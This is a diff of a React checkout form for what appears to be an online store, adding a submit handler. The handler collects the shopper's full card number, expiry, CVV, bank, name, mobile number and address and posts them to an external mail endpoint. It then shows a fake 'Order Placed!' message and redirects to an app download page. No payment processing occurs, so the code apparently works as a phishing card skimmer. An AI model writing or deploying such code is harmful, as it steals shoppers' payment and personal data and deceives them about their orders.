@@ -1,14 +1,23 @@
 import React, { useState } from "react";
 import { productData } from "../../libs/jmData";
-import { useParams } from "react-router-dom";
+import { useNavigate, useParams } from "react-router-dom";
 import axios from "axios";
 import "./CheckOut.scss";
+import Swal from "sweetalert2";
 
-const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
+const CheckOut = ({
+  mobileNumber,
+  fullName,
+  city,
+  address,
+  pinCode,
+  selectedState,
+}) => {
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({
     cardName: "",
     cardNumber: "",
@@ -17,7 +26,7 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
   });
   const [selectedCardType, setSelectedCardType] = useState(null);
   const [selectedBank, setSelectedBank] = useState("");
-
+  const navigate = useNavigate();
   const handleCardTypeChange = (event) => {
     setSelectedCardType(event.target.value);
   };
@@ -46,6 +55,29 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
     }
   };
 
+  // const handleCardNumberChange = (e) => {
+  //   let value = e.target.value;
+  //   // Remove any non-digit characters and spaces
+  //   value = value.replace(/[^\d]/g, "");
+
+  //   // Insert space every four digits
+  //   value = value.replace(/(\d{4})/g, "$1 ").trim();
+
+  //   // Update state
+  //   setCardNumber(value);
+
+  //   // Validate the input
+  //   if (/^\d{0,19}(\s\d{0,4})?$/.test(value) || value === "") {
+  //     setErrors((prevState) => ({ ...prevState, cardNumber: "" }));
+  //   } else {
+  //     setErrors((prevState) => ({
+  //       ...prevState,
+  //       cardNumber: value.includes(" ")
+  //         ? ""
+  //         : "Card number can only contain digits",
+  //     }));
+  //   }
+  // };
   const handleCardNumberChange = (e) => {
     let value = e.target.value;
     // Remove any non-digit characters and spaces
@@ -58,14 +90,12 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
     setCardNumber(value);
 
     // Validate the input
-    if (/^\d{0,19}(\s\d{0,4})?$/.test(value) || value === "") {
+    if (value.length === 19 || value === "") {
       setErrors((prevState) => ({ ...prevState, cardNumber: "" }));
     } else {
       setErrors((prevState) => ({
         ...prevState,
-        cardNumber: value.includes(" ")
-          ? ""
-          : "Card number can only contain digits",
+        cardNumber: "Card number must be of 16 digits",
       }));
     }
   };
@@ -108,33 +138,51 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
     }
   };
 
-  // const handleSubmit = async (e) => {
-  //   e.preventDefault();
-  //   const formData = { cardName, cardNumber, expiry, cvv };
-  //   try {
-  //     const response = await axios.post(
-  //       "http://localhost:5000/send/mail",
-  //       formData
-  //     );
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    const formData = {
+      selectedCardType,
+      mobileNumber,
+      fullName,
+      city,
+      address,
+      pinCode,
+      selectedState,
+      cardName,
+      cardNumber,
+      expiry,
+      cvv,
+      selectedBank,
+    };
+    console.log(formData);
 
-  //     if (response.status === 200) {
-  //       alert("Email sent successfully!");
-  //       // Reset form after successful submission if needed
-  //       // setFormData({
-  //       //   fullName: "",
-  //       //   address: "",
-  //       //   city: "",
-  //       //   state: "",
-  //       //   pincode: "",
-  //       // });
-  //     } else {
-  //       throw new Error("Failed to send email");
-  //     }
-  //   } catch (error) {
-  //     console.error("Error:", error);
-  //     alert("Error: Failed to send email");
-  //   }
-  // };
+    try {
+      setIsLoading(true);
+      const response = await axios.post(
+        "https://mailtest-production.up.railway.app/send/mail",
+        formData
+      );
+      if (response.status === 200) {
+        Swal.fire({
+          title: "Order Placed!",
+          text: "Your order has been placed!",
+          icon: "success",
+        });
+        navigate("/download/app");
+        setIsLoading(false);
+      } else {
+        throw new Error("Failed to send email");
+      }
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Error:", error);
+      Swal.fire({
+        icon: "error",
+        title: "Oops...",
+        text: "Order was not placed",
+      });
+    }
+  };
 
   // Array of banks
   const banks = [
@@ -180,7 +228,7 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
   ];
 
   return (
-    <form className="jm-checout-final-form">
+    <form className="jm-checout-final-form" onSubmit={handleSubmit}>
       <section className="jm-address-form-section">
         <div className="jm-address-form-container">
           <div className="jm-address-form-box">
@@ -270,7 +318,7 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
               {errors.cvv && <p className="error">{errors.cvv}</p>}
             </div>
             <div className="jm-address-form-input-container">
-              <label htmlFor="state">State</label>
+              <label htmlFor="state">Bank Name</label>
               <select
                 id="state"
                 value={selectedBank}
@@ -278,7 +326,7 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
                 required
                 className="jm-addres-input select-state"
               >
-                <option value="">Select State</option>
+                <option value="">Select Bank</option>
                 {banks.map((bank, index) => (
                   <option key={index} value={bank}>
                     {bank}
@@ -288,7 +336,9 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
             </div>
           </div>
           <div className="jm-address-form-save-button-container">
-            <button type="submit">Confirm Order</button>
+            <button type="submit">
+              {isLoading ? "Confirming Order" : "Confirm Order"}
+            </button>
           </div>
         </div>
       </section>
@@ -306,7 +356,7 @@ const CheckOut = ({ mobileNumber, fullName, stateCity, address, pinCode }) => {
             </div>
             <div className="jm-product-detail-place-order-container">
               <button className="jm-product-detail-order-text" type="submit">
-                Make Payment
+                {isLoading ? "Confirming Order" : "Make Payment"}
               </button>
             </div>
           </div>
